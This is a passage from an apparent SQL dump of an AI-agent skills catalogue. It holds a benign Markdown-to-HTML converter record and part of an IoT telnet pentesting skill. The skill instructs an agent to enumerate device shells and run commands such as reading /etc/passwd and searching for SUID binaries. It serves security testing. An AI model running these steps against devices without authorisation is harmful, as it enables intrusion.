ertisseur Markdown en HTML pour WeChat et autres","de":"Markdown zu HTML Konverter für WeChat und mehr","pt":"Conversor Markdown para HTML - baoyu-markdown-to-html","ru":"Преобразователь Markdown в HTML - baoyu-markdown-to-html","ar":"مُحَوِّل ماركداون إلى إتش تي إم إل - baoyu-markdown-to-html","en":"baoyu-markdown-to-html"},"description":{"zh":"baoyu-markdown-to-html技能是一种将Markdown文件转换为HTML的工具，支持内联CSS和WeChat公众号优化","ja":"baoyu-markdown-to-htmlスキルは、MarkdownファイルをHTMLに変換するツールで、インラインCSSとWeChat公式アカウントの最適化をサポート","ko":"baoyu-markdown-to-html 스킬은 Markdown 파일을 HTML로 변환하는 도구로, 인라인 CSS와 WeChat 공식 계정 최적화를 지원","es":"El convertidor Markdown a HTML es una herramienta que convierte archivos Markdown en HTML con CSS en línea, ideal para WeChat y otras plataformas","fr":"Le convertisseur Markdown en HTML est un outil qui convertit des fichiers Markdown en HTML avec CSS en ligne, idéal pour WeChat et d''autres plateformes","de":"Der Markdown zu HTML Konverter ist ein Werkzeug, das Markdown-Dateien in HTML mit CSS inline umwandelt, ideal für WeChat und andere Plattformen","pt":"O baoyu-markdown-to-html é um conversor de Markdown para HTML que gera HTML estilizados com CSS embutido, ideal para uso em Conta Oficial do WeChat e outras ...","ru":"baoyu-markdown-to-html - это преобразователь Markdown в HTML, который генерирует красиво оформленный HTML с встроенным CSS, подходящий для использования в оф...","ar":"baoyu-markdown-to-html هو مُحَوِّل ماركداون إلى إتش تي إم إل الذي يُنتج إتش تي إم إل مصممة بشكل جميل مع سي إس إس مدمج، مناسب للاستخدام في الحساب الرسمي على W...","en":""},"definition":{"en":""},"features":{"zh":["支持Markdown到HTML的转换","内联CSS样式","WeChat公众号优化","脚本目录支持","EXTEND.md配置"],"ja":["MarkdownをHTMLに変換する","インラインCSSスタイル","WeChat公式アカウントの最適化","スクリプトディレクトリのサポート","EXTEND.mdの設定"],"ko":["Markdown를 HTML로 변환","인라인 CSS 스타일","WeChat 공식 계정 최적화","스크립트 디렉토리 지원","EXTEND.md 설정"],"es":["Conversión de Markdown a HTML","CSS en línea para estilo personalizado","Optimizado para WeChat y otras plataformas","Fácil de usar y personalizar","Compatibilidad con varios formatos de archivo"],"fr":["Conversion de Markdown en HTML","CSS en ligne pour un style personnalisé","Optimisé pour WeChat et d''autres plateformes","Facile à utiliser et personnaliser","Compatibilité avec plusieurs formats de fichiers"],"de":["Umwandlung von Markdown in HTML","CSS inline für personalisierten Stil","Optimiert für WeChat und andere Plattformen","Einfach zu bedienen und anzupassen","Kompatibilität mit verschiedenen Dateiformaten"],"pt":["Conversão de Markdown para HTML","Geração de HTML estilizado com CSS embutido","Otimizado para Conta Oficial do WeChat","Compatível com outras plataformas","Uso de scripts em TypeScript","Configuração de preferências via EXTEND.md"],"ru":["Преобразование Markdown в HTML","Генерация оформленного HTML с встроенным CSS","Оптимизировано для официального аккаунта WeChat","Совместимо с другими платформами","Использование скриптов на TypeScript","Настройка предпочтений через EXTEND.md"],"ar":["تحويل ماركداون إلى إتش تي إم إل","توليد إتش تي إم إل مصممة بشكل جميل مع سي إس إس مدمج","مُحسَّن لccount الرسمي في WeChat","متوافق مع منصات أخرى","استخدام سكريبتات في تايب سكريبت","تكوين التفضيلات عبر EXTEND.md"]},"keywords":{"zh":["Markdown转HTML","baoyu-markdown-to-html","WeChat公众号","内联CSS","脚本目录","EXTEND.md"],"ja":["MarkdownをHTMLに変換","baoyu-markdown-to-html","WeChat公式アカウント","インラインCSS","スクリプトディレクトリ","EXTEND.md"],"ko":["Markdown를 HTML로 변환","baoyu-markdown-to-html","WeChat 공식 계정","인라인 CSS","스크립트 디렉토리","EXTEND.md"],"es":["convertidor Markdown a HTML","WeChat","CSS en línea","optimización de contenido","herramientas de desarrollo","Markdown","HTML","desarrollo web"],"fr":["convertisseur Markdown en HTML","WeChat","CSS en ligne","optimisation de contenu","outils de développement","Markdown","HTML","développement web"],"de":["Markdown zu HTML Konverter","WeChat","CSS inline","Inhaltsoptimierung","Entwicklungstools","Markdown","HTML","Webentwicklung"],"pt":["conversor markdown para html","markdown para html","html estilizado","css embutido","wechat oficial","typescript","extend.md"],"ru":["преобразователь markdown в html","markdown в html","оформленный html","встроенный css","официальный аккаунт wechat","typescript","extend.md"],"ar":["مُحَوِّل ماركداون إلى إتش تي إم إل","ماركداون إلى إتش تي إم إل","إتش تي إم إل مصممة بشكل جميل","سي إس إس مدمج","حساب oficial في WeChat","تايب سكريبت","extend.md"]}},"owner":"JimLiu","repo":"baoyu-skills","repoPath":"JimLiu/baoyu-skills","stars":0,"forks":0,"updatedAt":"2026-02-18T01:08:43.396Z","topics":[],"category":"community","skillMd":{"name":"baoyu-markdown-to-html","description":"Converts Markdown to styled HTML with WeChat-compatible themes. Supports code highlighting, math, PlantUML, footnotes, alerts, and infographics. Use when user asks for markdown to html, convert md to html, md转html, or needs styled HTML output from markdown.","bodyPreview":"# Markdown to HTML Converter\n\nConverts Markdown files to beautifully styled HTML with inline CSS, optimized for WeChat Official Account and other platforms.\n\n## Script Directory\n\n**Agent Execution**: Determine this SKILL.md directory as `SKILL_DIR`, then use `${SKILL_DIR}/scripts/<name>.ts`.\n\n| Script | Purpose |\n|--------|---------|\n| `scripts/main.ts` | Main entry point |\n\n## Preferences (EXTEND.md)\n\nUse Bash to check EXTEND.md existence (priority order):\n\n```bash\n# Check project-level first\nt","body":"# Markdown to HTML Converter\n\nConverts Markdown files to beautifully styled HTML with inline CSS, optimized for WeChat Official Account and other platforms.\n\n## Script Directory\n\n**Agent Execution**: Determine this SKILL.md directory as `SKILL_DIR`, then use `${SKILL_DIR}/scripts/<name>.ts`.\n\n| Script | Purpose |\n|--------|---------|\n| `scripts/main.ts` | Main entry point |\n\n## Preferences (EXTEND.md)\n\nUse Bash to check EXTEND.md existence (priority order):\n\n```bash\n# Check project-level first\ntest -f .baoyu-skills/baoyu-markdown-to-html/EXTEND.md && echo \"project\"\n\n# Then user-level (cross-platform: $HOME works on macOS/Linux/WSL)\ntest -f \"$HOME/.baoyu-skills/baoyu-markdown-to-html/EXTEND.md\" && echo \"user\"\n```\n\n┌──────────────────────────────────────────────────────────────┬───────────────────┐\n│                             Path                             │     Location      │\n├──────────────────────────────────────────────────────────────┼───────────────────┤\n│ .baoyu-skills/baoyu-markdown-to-html/EXTEND.md               │ Project directory │\n├──────────────────────────────────────────────────────────────┼───────────────────┤\n│ $HOME/.baoyu-skills/baoyu-markdown-to-html/EXTEND.md         │ User home         │\n└──────────────────────────────────────────────────────────────┴───────────────────┘\n\n┌───────────┬───────────────────────────────────────────────────────────────────────────┐\n│  Result   │                                  Action                                   │\n├───────────┼───────────────────────────────────────────────────────────────────────────┤\n│ Found     │ Read, parse, apply settings                                               │\n├───────────┼───────────────────────────────────────────────────────────────────────────┤\n│ Not found │ Use defaults                                                              │\n└───────────┴───────────────────────────────────────────────────────────────────────────┘\n\n**EXTEND.md Supports**: Default theme | Custom CSS variables | Code block style\n\n## Workflow\n\n### Step 0: Pre-check (Chinese Content)\n\n**Condition**: Only execute if input file contains Chinese text.\n\n**Detection**:\n1. Read input markdown file\n2. Check if content contains CJK characters (Chinese/Japanese/Korean)\n3. If no CJK content → skip to Step 1\n\n**Format Suggestion**:\n\nIf CJK content detected AND `baoyu-format-markdown` skill is available:\n\nUse `AskUserQuestion` to ask whether to format first. Formatting can fix:\n- Bold markers with punctuation inside causing `**` parse failures\n- CJK/English spacing issues\n\n**If user agrees**: Invoke `baoyu-format-markdown` skill to format the file, then use formatted file as input.\n\n**If user declines**: Continue with original file.\n\n### Step 1: Confirm Theme\n\nBefore converting, use AskUserQuestion to confirm the theme (unless user already specified):\n\n| Theme | Description |\n|-------|-------------|\n| `default` (Recommended) | 经典主题 - 传统排版，标题居中带底边，二级标题白字彩底 |\n| `grace` | 优雅主题 - 文字阴影，圆角卡片，精致引用块 |\n| `simple` | 简洁主题 - 现代极简风，不对称圆角，清爽留白 |\n\n### Step 2: Convert\n\n```bash\nnpx -y bun ${SKILL_DIR}/scripts/main.ts <markdown_file> --theme <theme>\n```\n\n### Step 3: Report Result\n\nDisplay the output path from JSON result. If backup was created, mention it.\n\n## Usage\n\n```bash\nnpx -y bun ${SKILL_DIR}/scripts/main.ts <markdown_file> [options]\n```\n\n**Options:**\n\n| Option | Description | Default |\n|--------|-------------|---------|\n| `--theme <name>` | Theme name (default, grace, simple) | default |\n| `--title <title>` | Override title from frontmatter | |\n| `--keep-title` | Keep the first heading in content | false (removed) |\n| `--help` | Show help | |\n\n**Examples:**\n\n```bash\n# Basic conversion (uses default theme, removes first heading)\nnpx -y bun ${SKILL_DIR}/scripts/main.ts article.md\n\n# With specific theme\nnpx -y bun ${SKILL_DIR}/scripts/main.ts article.md --theme grace\n\n# Keep the first heading in content\nnpx -y bun ${SKILL_DIR}/scripts/main.ts article.md --keep-title\n\n# Override title\nnpx -y bun ${SKILL_DIR}/scripts/main.ts article.md --title \"My Article\"\n```\n\n## Output\n\n**File location**: Same directory as input markdown file.\n- Input: `/path/to/article.md`\n- Output: `/path/to/article.html`\n\n**Conflict handling**: If HTML file already exists, it will be backed up first:\n- Backup: `/path/to/article.html.bak-YYYYMMDDHHMMSS`\n\n**JSON output to stdout:**\n\n```json\n{\n  \"title\": \"Article Title\",\n  \"author\": \"Author Name\",\n  \"summary\": \"Article summary...\",\n  \"htmlPath\": \"/path/to/article.html\",\n  \"backupPath\": \"/path/to/article.html.bak-20260128180000\",\n  \"contentImages\": [\n    {\n      \"placeholder\": \"MDTOHTMLIMGPH_1\",\n      \"localPath\": \"/path/to/img.png\",\n      \"originalPath\": \"imgs/image.png\"\n    }\n  ]\n}\n```\n\n## Themes\n\n| Theme | Description |\n|-------|-------------|\n| `default` | 经典主题 - 传统排版，标题居中带底边，二级标题白字彩底 |\n| `grace` | 优雅主题 - 文字阴影，圆角卡片，精致引用块 (by @brzhang) |\n| `simple` | 简洁主题 - 现代极简风，不对称圆角，清爽留白 (by @okooo5km) |\n\n## Supported Markdown Features\n\n| Feature | Syntax |\n|---------|--------|\n| Headings | `# H1` to `###### H6` |\n| Bold/Italic | `**bold**`, `*italic*` |\n| Code blocks | ` ```lang ` with syntax highlighting |\n| Inline code | `` `code` `` |\n| Tables | GitHub-flavored markdown tables |\n| Images | `![alt](src)` |\n| Links | `[text](url)` with footnote references |\n| Blockquotes | `> quote` |\n| Lists | `-` unordered, `1.` ordered |\n| Alerts | `> [!NOTE]`, `> [!WARNING]`, etc. |\n| Footnotes | `[^1]` references |\n| Ruby text | `{base|annotation}` |\n| Mermaid | ` ```mermaid ` diagrams |\n| PlantUML | ` ```plantuml ` diagrams |\n\n## Frontmatter\n\nSupports YAML frontmatter for metadata:\n\n```yaml\n---\ntitle: Article Title\nauthor: Author Name\ndescription: Article summary\n---\n```\n\nIf no title is found, extracts from first H1/H2 heading or uses filename.\n\n## Extension Support\n\nCustom configurations via EXTEND.md. See **Preferences** section for paths and supported options.\n"},"lastSynced":"2026-02-18T02:19:15.261Z","agentAnalysis":{"suitability":{"en":"Ideal for AI Agents like Cursor and AutoGPT that require seamless conversion of Markdown files to HTML for web publishing and content creation.","zh":"适用于像 Cursor 和 AutoGPT 这样的 AI 代理，它们需要无缝地将 Markdown 文件转换为 HTML 以进行网络发布和内容创作。","ja":"Cursor や AutoGPT などの Markdown ファイルを HTML に無駄なく変換して Web に公開し、コンテンツを作成する必要がある AI エージェントに最適です。","ko":"Cursor 및 AutoGPT와 같은 AI 에이전트에 적합하며, 웹 게시 및 콘텐츠 생성을 위해 Markdown 파일을 HTML로 무난하게 변환해야 합니다.","es":"Ideal para agentes de IA como Cursor y AutoGPT que requieren una conversión sin problemas de archivos Markdown a HTML para publicación web y creación de contenido.","fr":"Idéal pour les agents IA comme Cursor et AutoGPT qui nécessitent une conversion sans accroc de fichiers Markdown en HTML pour la publication Web et la création de contenu.","de":"Ideal für KI-Agenten wie Cursor und AutoGPT, die eine nahtlose Konvertierung von Markdown-Dateien in HTML für das Web-Publishing und die Content-Erstellung erfordern.","pt":"Ideal para Agentes de IA como Cursor e AutoGPT que requerem conversão sem interrupções de arquivos Markdown para HTML para publicação na web e criação de conteúdo.","ru":"Идеально подходит для агентов ИИ, таких как Cursor и AutoGPT, которые требуют бесперебойного преобразования файлов Markdown в HTML для публикации в Интернете и создания контента.","ar":"مثالي لعميل الذكاء الاصطناعي مثل Cursor و AutoGPT الذين يتطلبون تحويلًا بدون انقطاع لملفات Markdown إلى HTML لنشر الويب وإنشاء المحتوى."},"recommendation":{"en":"Empowers agents to convert Markdown files to beautifully styled HTML with inline CSS, optimized for WeChat Official Account and other platforms, utilizing TypeScript scripts for execution and EXTEND.md for preference configuration.","zh":"赋予代理将 Markdown 文件转换为带有内联 CSS 的精美样式的 HTML，针对微信公众号和其他平台进行优化，使用 TypeScript 脚本执行，并使用 EXTEND.md 进行首选项配置。","ja":"エージェントに Markdown ファイルを、インライン CSS を持つ美しいスタイルの HTML に変換する力を与え、WeChat 公式アカウントや他のプラットフォーム向けに最適化し、TypeScript スクリプトを使用して実行し、EXTEND.md を使用してプリファレンスを構成します。","ko":"에이전트가 Markdown 파일을 美しい 스타일의 HTML로 변환할 수 있게 해주며, WeChat 공식 계정 및 기타 플랫폼을 위한 최적화를 지원하며, TypeScript 스크립트를 사용하여 실행하며, EXTEND.md를 사용하여 환경 설정을 구성할 수 있습니다.","es":"Permite a los agentes convertir archivos Markdown en HTML con estilo hermoso y CSS en línea, optimizado para la cuenta oficial de WeChat y otras plataformas, utilizando scripts de TypeScript para la ejecución y EXTEND.md para la configuración de preferencias.","fr":"Permet aux agents de convertir des fichiers Markdown en HTML stylisé avec du CSS en ligne, optimisé pour le compte officiel WeChat et d''autres plateformes, en utilisant des scripts TypeScript pour l''exécution et EXTEND.md pour la configuration des préférences.","de":"Ermöglicht es Agenten, Markdown-Dateien in schön gestalteten HTML mit Inline-CSS zu konvertieren, optimiert für das offizielle WeChat-Konto und andere Plattformen, unter Verwendung von TypeScript-Skripten für die Ausführung und EXTEND.md für die Konfiguration von Vorlieben.","pt":"Habilita agentes a converter arquivos Markdown em HTML com estilo bonito e CSS embutido, otimizado para Conta Oficial do WeChat e outras plataformas, utilizando scripts TypeScript para execução e EXTEND.md para configuração de preferências.","ru":"Наделяет агентов возможностью преобразовывать файлы Markdown в красиво оформленный HTML с встроенным CSS, оптимизированный для официальных аккаунтов WeChat и других платформ, использующих скрипты TypeScript для выполнения и EXTEND.md для конфигурации предпочтений.","ar":"تمكين العميل من تحويل ملفات Markdown إلى HTML مصممة جماليًا مع CSS مدمج، متوافق مع حساب WeChat الرسمي ومنصات أخرى، باستخدام سكريبتات TypeScript للتنفيذ وEXTEND.md لتكوين التفضيلات."},"useCases":{"en":["Converting Markdown documents to HTML for web publication","Generating styled HTML content for WeChat Official Accounts","Automating Markdown to HTML conversion for blogging and content creation"],"zh":["将 Markdown 文档转换为 HTML 以进行 Web 发布","为 WeChat 公众号生成样式化的 HTML 内容","自动化 Markdown 到 HTML 的转换以进行博客和内容创作"],"ja":["Web 発行のために Markdown ドキュメントを HTML に変換する","WeChat 公式アカウント向けにスタイル付けされた HTML コンテンツを生成する","ブログやコンテンツ作成のために Markdown から HTML への変換を自動化する"],"ko":["웹 게시를 위해 Markdown 문서를 HTML로 변환하는 것","WeChat 공식 계정용으로 스타일된 HTML 콘텐츠를 생성하는 것","블로그 및 콘텐츠 생성을 위해 Markdown에서 HTML로의 변환을 자동화하는 것"],"es":["Conversión de documentos Markdown a HTML para publicación web","Generación de contenido HTML con estilo para cuentas oficiales de WeChat","Automatización de la conversión de Markdown a HTML para blogging y creación de contenido"],"fr":["Conversion de documents Markdown en HTML pour publication Web","Génération de contenu HTML stylisé pour les comptes officiels WeChat","Automatisation de la conversion de Markdown en HTML pour le blogging et la création de contenu"],"de":["Konvertierung von Markdown-Dokumenten in HTML für das Web-Publishing","Erzeugung von gestaltetem HTML-Inhalt für offizielle WeChat-Konten","Automatisierung der Konvertierung von Markdown in HTML für Blogging und Content-Erstellung"],"pt":["Conversão de documentos Markdown para HTML para publicação na web","Geração de conteúdo HTML estilizado para Contas Oficiais do WeChat","Automação da conversão de Markdown para HTML para blogging e criação de conteúdo"],"ru":["Преобразование документов Markdown в HTML для публикации в Интернете","Генерация стилизованного контента HTML для официальных аккаунтов WeChat","Автоматизация преобразования Markdown в HTML для блогинга и создания контента"],"ar":["تحويل مستندات Markdown إلى HTML لنشر الويب","توليد محتوى HTML مصمم جماليًا لحسابات WeChat الرسمية","أتمتة تحويل Markdown إلى HTML لإنشاء بلوق وإنشاء المحتوى"]},"limitations":{"en":["Requires TypeScript execution environment","Limited to Markdown to HTML conversion","Optimized for specific platforms like WeChat Official Account"],"zh":["需要 TypeScript 执行环境","仅限于 Markdown 到 HTML 的转换","针对特定平台如 WeChat 公众号进行优化"],"ja":["TypeScript 実行環境が必要","Markdown から HTML への変換のみ","WeChat 公式アカウントなどの特定のプラットフォーム向けに最適化"],"ko":["TypeScript 실행 환경이 필요합니다","Markdown에서 HTML로의 변환만 가능합니다","WeChat 공식 계정 같은 특정 플랫폼을 위한 최적화"],"es":["Requiere un entorno de ejecución de TypeScript","Limitado a la conversión de Markdown a HTML","Optimizado para plataformas específicas como la cuenta oficial de WeChat"],"fr":["Nécessite un environnement d''exécution TypeScript","Limité à la conversion de Markdown en HTML","Optimisé pour des plateformes spécifiques comme le compte officiel WeChat"],"de":["Benötigt eine TypeScript-Ausführungsumgebung","Begrenzt auf die Konvertierung von Markdown in HTML","Optimiert für bestimmte Plattformen wie das offizielle WeChat-Konto"],"pt":["Requer ambiente de execução TypeScript","Limitado à conversão de Markdown para HTML","Otimizado para plataformas específicas como Conta Oficial do WeChat"],"ru":["Требует среды выполнения TypeScript","Ограничен преобразованием Markdown в HTML","Оптимизирован для конкретных платформ, таких как официальный аккаунт WeChat"],"ar":["يتطلب بيئة تنفيذ TypeScript","محدود بتحويل Markdown إلى HTML","مُتوافق مع منصات محددة مثل حساب WeChat الرسمي"]},"version":3},"qualityScore":65}');
INSERT OR REPLACE INTO skills (id, category, owner, repo, repo_path, name, stars, forks, quality_score, updated_at, last_synced, content_hash, data_json) VALUES ('BrownFineSecurity/iothackbot/telnetshell', 'community', 'BrownFineSecurity', 'iothackbot', 'BrownFineSecurity/iothackbot', 'telnetshell', 0, 0, 80, '2026-02-18T01:08:43.396Z', '2026-02-18T02:19:55.862Z', NULL, '{"id":"BrownFineSecurity/iothackbot/telnetshell","name":"telnetshell","description":{"zh":"telnetshell IoT  telnet ","ja":"telnetshell IoT  telnet ","ko":"telnetshell IoT  telnet ","es":"Telnetshell es una herramienta para pruebas de penetración en dispositivos IoT, que permite interactuar con shells de dispositivos accesibles via telnet.","fr":"Telnetshell est un outil de test de pénétration pour les appareils IoT, qui permet d''interagir avec les shells d''appareils accessibles via telnet.","de":"Telnetshell ist ein Tool für PenetrationsTests auf IoT-Geräten, das die Interaktion mit Geräteshells ermöglicht, die über telnet zugänglich sind.","pt":"O telnetshell é uma ferramenta para interagir com dispositivos IoT via telnet, permitindo testes de segurança e penetração","ru":"Telnetshell - это инструмент для взаимодействия с устройствами IoT через telnet, позволяющий проводить тесты безопасности и проникновения","ar":"telnetshell هو أداة للتفاعل مع أجهزة آي أو تي عبر telnet، مما يسمح باختبار الأمان والاختراق","en":"IoT HackBot: A collection of Claude Skills and custom tooling for hybrid IoT pentesting"},"seo":{"title":{"zh":"IoT Telnet Shell - telnetshell","ja":"IoT Telnet Shell - telnetshell","ko":"IoT Telnet Shell - telnetshell","es":"Telnetshell: Herramienta de pruebas de penetración para IoT","fr":"Telnetshell : Outil de test de pénétration pour l''IoT","de":"Telnetshell: Tool für IoT-PenetrationsTests","pt":"Telnet Shell para Testes de Segurança IoT","ru":"Telnet Shell для тестирования безопасности IoT","ar":"Telnet Shell لأمان آي أو تي","en":"telnetshell"},"description":{"zh":"telnetshell IoT  telnet ","ja":"telnetshell IoT  telnet ","ko":"telnetshell IoT  telnet ","es":"Telnetshell es una herramienta para pruebas de penetración en dispositivos IoT, que permite interactuar con shells de dispositivos accesibles via telnet.","fr":"Telnetshell est un outil de test de pénétration pour les appareils IoT, qui permet d''interagir avec les shells d''appareils accessibles via telnet.","de":"Telnetshell ist ein Tool für PenetrationsTests auf IoT-Geräten, das die Interaktion mit Geräteshells ermöglicht, die über telnet zugänglich sind.","pt":"O telnetshell é uma ferramenta para interagir com dispositivos IoT via telnet, permitindo testes de segurança e penetração","ru":"Telnetshell - это инструмент для взаимодействия с устройствами IoT через telnet, позволяющий проводить тесты безопасности и проникновения","ar":"telnetshell هو أداة للتفاعل مع أجهزة آي أو تي عبر telnet، مما يسمح باختبار الأمان والاختراق","en":"IoT HackBot: A collection of Claude Skills and custom tooling for hybrid IoT pentesting"},"definition":{"en":"IoT HackBot: A collection of Claude Skills and custom tooling for hybrid IoT pentesting"},"features":{"zh":["telnet "," ","telnet","IoT ","post-exploitation"],"ja":["telnet "," ","telnet","IoT ","post-exploitation"],"ko":["telnet "," ","telnet","IoT ","post-exploitation"],"es":["Soporte para shells no autenticados","Pruebas de autenticación débil","Enumeración de dispositivos","Actividades de post-explotación"],"fr":["Prise en charge des shells non authentifiés","Tests d''authentification faible","Énumération des appareils","Activités de post-exploitation"],"de":["Unterstützung für nicht authentifizierte Shells","Schwache Authentifizierungstests","Auflistung von Geräten","Post-Exploitation-Aktivitäten"],"pt":["Suporte a shells não autenticados","Teste de autenticação fraca","Enumeração de dispositivos","Atividades pós-exploração"],"ru":["Поддержка неавторизованных shells","Тестирование слабой аутентификации","Перечисление устройств","Пост-эксплуатационные действия"],"ar":["دعم shells غير مصحوب بترخيص","اختبار المصادقة الضعيفة","تنمية الأجهزة","أعمال ما بعد الاختراق"]},"keywords":{"zh":["IoT telnet","telnetshell","IoT ","penetration testing","security testing","telnet client","pexpect library"],"ja":["IoT telnet","telnetshell","IoT ","penetration testing","security testing","telnet client","pexpect library"],"ko":["IoT telnet","telnetshell","IoT ","penetration testing","security testing","telnet client","pexpect library"],"es":["pruebas de penetración","seguridad IoT","telnetshell","herramientas de seguridad","pruebas de seguridad","IoT"],"fr":["tests de pénétration","sécurité IoT","telnetshell","outils de sécurité","tests de sécurité","IoT"],"de":["PenetrationsTests","IoT-Sicherheit","telnetshell","Sicherheitstools","Sicherheitstests","IoT"],"pt":["telnetshell","teste de segurança IoT","pentest IoT","dispositivos IoT","segurança de rede","teste de penetração"],"ru":["telnetshell","тестирование безопасности IoT","пентест IoT","устройства IoT","сетевая безопасность","тестирование на проникновение"],"ar":["telnetshell","اختبار أمان آي أو تي","اختراق آي أو تي","أجهزة آي أو تي","أمان الشبكة","اختبار الاختراق"]}},"owner":"BrownFineSecurity","repo":"iothackbot","repoPath":"BrownFineSecurity/iothackbot","stars":0,"forks":0,"updatedAt":"2026-02-18T01:08:43.396Z","topics":[],"category":"community","skillMd":{"name":"telnetshell","description":"Use telnet to interact with IoT device shells for pentesting operations including device enumeration, vulnerability discovery, credential testing, and post-exploitation. Use when the user needs to interact with network-accessible shells, IoT devices, or telnet services.","bodyPreview":"# IoT Telnet Shell (telnetshell)\n\nThis skill enables interaction with IoT device shells accessible via telnet for security testing and penetration testing operations. It supports unauthenticated shells, weak authentication testing, device enumeration, and post-exploitation activities.\n\n## Prerequisites\n\n- Python 3 with pexpect library (`pip install pexpect` or `sudo pacman -S python-pexpect`)\n- telnet client installed on the system (`sudo pacman -S inetutils` on Arch)\n- Network access to the tar","body":"# IoT Telnet Shell (telnetshell)\n\nThis skill enables interaction with IoT device shells accessible via telnet for security testing and penetration testing operations. It supports unauthenticated shells, weak authentication testing, device enumeration, and post-exploitation activities.\n\n## Prerequisites\n\n- Python 3 with pexpect library (`pip install pexpect` or `sudo pacman -S python-pexpect`)\n- telnet client installed on the system (`sudo pacman -S inetutils` on Arch)\n- Network access to the target device''s telnet port\n\n## Recommended Approach: Telnet Helper Script\n\n**IMPORTANT**: This skill includes a Python helper script (`telnet_helper.py`) that provides a clean, reliable interface for telnet communication. **This is the RECOMMENDED method** for interacting with IoT devices.\n\n### Default Session Logging\n\n**ALL commands run by Claude will be logged to `/tmp/telnet_session.log` by default.**\n\nTo observe what Claude is doing in real-time:\n```bash\n# In a separate terminal, run:\ntail -f /tmp/telnet_session.log\n```\n\nThis allows you to watch all telnet I/O as it happens without interfering with the connection.\n\n### Why Use the Telnet Helper?\n\nThe helper script solves many problems with direct telnet usage:\n- **Clean output**: Automatically removes command echoes, prompts, and ANSI codes\n- **Prompt detection**: Automatically detects and waits for device prompts\n- **Timeout handling**: Proper timeout management with no arbitrary sleeps\n- **Easy scripting**: Simple command-line interface for single commands or batch operations\n- **Session logging**: All I/O logged to `/tmp/telnet_session.log` for observation\n- **Reliable**: No issues with TTY requirements or background processes\n- **JSON output**: For programmatic parsing and tool chaining\n\n### Quick Start with Telnet Helper\n\n**Single Command:**\n```bash\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --command \"uname -a\"\n```\n\n**Custom Port:**\n```bash\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --port 2222 --command \"ls /\"\n```\n\n**With Custom Prompt (recommended for known devices):**\n```bash\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --prompt \"^/ [#\\$]\" --command \"ifconfig\"\n```\n\n**Interactive Mode:**\n```bash\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --port 2222 --interactive\n```\n\n**Batch Commands from File:**\n```bash\n# Create a file with commands (one per line)\necho -e \"uname -a\\ncat /proc/version\\nifconfig\\nps\" > commands.txt\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --script commands.txt\n```\n\n**JSON Output (for parsing):**\n```bash\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --command \"uname -a\" --json\n```\n\n**Debug Mode:**\n```bash\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --command \"ls\" --debug\n```\n\n**Session Logging (for observation):**\n```bash\n# Terminal 1 - Run with logging\npython3 .claude/skills/telnetshell/telnet_helper.py \\\n  --host 192.168.1.100 \\\n  --port 2222 \\\n  --logfile /tmp/session.log \\\n  --interactive\n\n# Terminal 2 - Watch the session in real-time\ntail -f /tmp/session.log\n```\n\n**Note:** See `OBSERVING_SESSIONS.md` for comprehensive guide on monitoring telnet sessions.\n\n### Telnet Helper Options\n\n```\nRequired (one of):\n  --command, -c CMD         Execute single command\n  --interactive, -i         Enter interactive mode\n  --script, -s FILE         Execute commands from file\n\nConnection Options:\n  --host, -H HOST           Target host IP or hostname (required)\n  --port, -P PORT           Telnet port (default: 23)\n  --timeout, -t SECONDS     Command timeout (default: 3.0)\n  --prompt, -p PATTERN      Custom prompt regex pattern\n\nOutput Options:\n  --raw, -r                 Don''t clean output (show echoes, prompts)\n  --json, -j                Output in JSON format\n  --logfile, -l FILE        Log all I/O to file (default: /tmp/telnet_session.log)\n  --debug                   Show debug information\n```\n\n### Common Prompt Patterns\n\nThe helper script includes common prompt patterns, but you can specify custom ones:\n\n```bash\n# BusyBox shell (common on IoT)\n--prompt \"/\\s*[#\\$]\\s*$\"\n\n# Standard root/user prompts\n--prompt \"^[#\\$]\\s*$\"\n\n# Custom device\n--prompt \"^MyDevice>\\s*$\"\n\n# Uniview cameras\n--prompt \"^User@[^>]+>\\s*$\"\n```\n\n### Device Enumeration Example with Telnet Helper\n\nHere''s a complete example of safely enumerating a device:\n\n```bash\n# Set variables for convenience\nHELPER=\"python3 .claude/skills/telnetshell/telnet_helper.py\"\nHOST=\"192.168.1.100\"\nPORT=\"2222\"\nLOGFILE=\"/tmp/telnet_session.log\"\n\n# System information\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"uname -a\"\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"cat /proc/version\"\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"cat /proc/cpuinfo\"\n\n# Check for BusyBox\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"busybox\"\n\n# Network configuration\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"ifconfig\"\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"route -n\"\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"netstat -tulpn\"\n\n# Process listing (may need longer timeout)\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --timeout 5 --command \"ps aux\"\n\n# File system exploration\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"ls -la /\"\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"mount\"\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"df -h\"\n\n# Security assessment\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"cat /etc/passwd\"\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"find / -perm -4000 2>/dev/null\"\n```\n\n**IMPORTANT FOR CLAUDE CODE**: When using this skill, ALWAYS include `--logfile /tmp/telnet_session.log` in every command so the user can monitor activity with `tail -f /tmp/telnet_session.log`.\n\n## Instructions\n\n### 1. Connection Setup\n\n**Default connection:**\n- **Port**: 23 (standard telnet, override with `--port`)\n- **Timeout**: 3 seconds (override with `--timeout`)\n- **Logging**: `/tmp/telnet_session.log` by default\n\n**Common telnet ports on IoT devices:**\n- 23: Standard telnet port\n- 2222: Alternative telnet port (common on cameras)\n- 8023: Alternative telnet port\n- Custom ports: Check device documentation or nmap scan results\n\n### 2. BusyBox Shells (Most 